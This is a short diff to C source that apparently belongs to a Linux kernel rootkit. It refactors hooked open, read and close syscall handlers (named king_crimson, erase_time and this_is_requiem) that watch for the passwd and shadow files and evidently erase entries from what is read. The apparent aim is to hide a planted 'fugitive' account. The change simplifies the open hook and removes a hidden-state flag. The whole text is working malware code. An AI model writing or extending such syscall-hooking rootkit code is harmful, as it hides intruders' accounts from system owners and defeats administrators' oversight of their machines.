@@ -285,17 +285,8 @@ ssize_t append_to_file(char *file_path, char *fug){
 asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
     if(!strcmp(PASSWD_PATH, pathname)){
         erase = PASS_E;
-        goto erase_set;
-    }
-
-    if(!strcmp(SHADOW_PATH, pathname)){
+    } else if(!strcmp(SHADOW_PATH, pathname)){
         erase = SHAD_E;
-        goto erase_set;
-    }
-
-    erase_set:
-    if(erase && !fugitive__hidden){
-        fugitive__hidden = ~0;
     }
     return (*good_open)(pathname, flags, mode);
 }
@@ -317,6 +308,7 @@ asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
             break;
         case NONE:
             //something went wrong
+            //or this file wasn't one of our targets
             break;
     }
 
@@ -333,7 +325,6 @@ asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
 asmlinkage int this_is_requiem(int fd){
     if(erase){
         erase = NONE;
-        fugitive__hidden = 0;
     }
     return (*good_close)(fd);
 }
